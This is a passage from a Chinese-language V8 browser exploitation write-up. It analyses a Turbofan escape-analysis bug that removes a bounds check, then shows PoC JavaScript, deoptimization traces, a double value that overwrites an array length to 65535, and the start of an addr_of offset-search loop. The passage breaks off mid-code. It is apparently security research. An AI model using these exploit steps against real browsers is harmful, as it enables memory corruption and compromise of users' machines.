    }
## Turbolizer分析
我们首先在Turbolizer中查看函数图。在消除负载(Load Eliminated)阶段，漏洞还未发生，程序流程如图所示，我添加了一些注释用来说明：
在这之后是Merge，可以看到这里有一个边界检查，然后是`LoadElement`节点，在这里查找`l[0.a]`。在这个阶段，漏洞还没有发生，查找顺利进行。
接下来，我们在漏洞发生的逃逸分析阶段后寻找差异。可以看到`Phi[kRepTagged]
Range(0,1)`被加到了`CheckBounds`和`LoadElement`之前。因为Turbofan
在前面的执行过程中发现值只能是0或1，所以编译器将类型设置为`Range(0,1)`。
最后我们看下一个阶段，简化降低(Simplified Lowering)阶段，看起来因为期望类型是Range(0,1)，边界检查被优化删除掉了：
缺少边界检查使我们可以读写超出数组边界的部分。
## Exploitation
刚开始看第一个测试用例的时候，发现它是通过验证f(101)未定义，来确认无法越界读取数组的。
为了验证该猜想，可以在有漏洞的V8版本上运行该PoC，把assertEquals替换为print。
    function f(x) {
      var o = {a : 0};
      var l = [1,2,3,4]
      var res;
      for (var i = 0; i  (opt #0) @36, FP to SP delta: 136, caller sp: 0x7fff6cfe2fe0]
                ;;; deoptimize at , out of bounds
    // Convenience functions. These allocate a new Int64 to hold the result.
      reading input frame f => bytecode_offset=146, args=2, height=11; inputs:
          0: 0x1ad49b9ad3a9 ; [fp - 16] 0x1ad49b9ad3a9 
          1: 0x25e9267033e1 ; [fp + 24] 0x25e9267033e1 
          2: 0x700000000 ; [fp + 16] 7
          3: 0x1ad49b983d91 ; [fp - 8] 0x1ad49b983d91 
          4: 0x25e92671e4e1 ; [fp - 24] 0x25e92671e4e1 
          5: 0x25e92671e531 ; rcx 0x25e92671e531 
          6: 0x384e6fd82311 ; (literal 5) 0x384e6fd82311 
          7: 1 ; (int) [fp - 40]
          8: 0x384e6fd825a9 ; (literal 6) 0x384e6fd825a9 
          9: 0x700000000 ; [fp - 48] 7
         10: 0x384e6fd825a9 ; (literal 6) 0x384e6fd825a9 
         11: 0x384e6fd825a9 ; (literal 6) 0x384e6fd825a9 
         12: 0x384e6fd825a9 ; (literal 6) 0x384e6fd825a9 
         13: 0x384e6fd825a9 ; (literal 6) 0x384e6fd825a9 
         14: 0x25e92671fec1 ; rax 0x25e92671fec1 
      translating interpreted frame f => bytecode_offset=146, height=88
        0x7fff6cfe2fd8: [top + 152]   (input #1)
        0x7fff6cfe2fd0: [top + 144]   (input #3)
        0x7fff6cfe2fb0: [top + 112]   (input #0)
        0x7fff6cfe2fa8: [top + 104]   (input #0)
        0x7fff6cfe2fa0: [top + 96]   (input #0)
        0x7fff6cfe2f98: [top + 88]   (input #4)
        0x7fff6cfe2f88: [top + 72]   (input #5)
        0x7fff6cfe2f80: [top + 64]   (input #6)
        0x7fff6cfe2f78: [top + 56]   (input #8)
        0x7fff6cfe2f68: [top + 40]   (input #10)
        0x7fff6cfe2f58: [top + 24]   (input #11)
        0x7fff6cfe2f50: [top + 16]   (input #12)
        0x7fff6cfe2f48: [top + 8]   (input #13)
        0x7fff6cfe2f40: [top + 0]   (input #14)
    [deoptimizing (eager): end 0x1ad49b9ad3a9  @36 => node=146, pc=0xe6f4b9c2a80, caller sp=0x7fff6cfe2fe0, state=TOS_REGISTER, took 0.296 ms]
    [removing optimized code for: 0x1ad49b9ad3a9 ]
可以使用65535的对应double值来修复这一问题：
    initial_oob_array[o.a] = 1.39064994160909e-309;
函数可以继续被优化，`oob_arry.length`也被覆盖了：
    ../accidentalnday_release/d8 bug.js --allow-natives-syntax --turbo-escape --turbo-experimental --no-turbo-loop-peeling --trace-deopt
    0x7ff8000000000000
    Smashed oob_array length to: 65535
要创建`addr_of`，需要一个elements数组。
为了找到该数组的偏移量，我们放置要搜索的元素，像是下面的`1337`：
    elements_array = [1337,{},{}]
可以使用下面的循环找到偏移量：
    function find_offset_smi(val) {
    for (i=0; i<5000; i++){
      if (oob_array[i] == new Int64(int_to_smi(val)).asDouble()) {
        print("Found offset: "+i);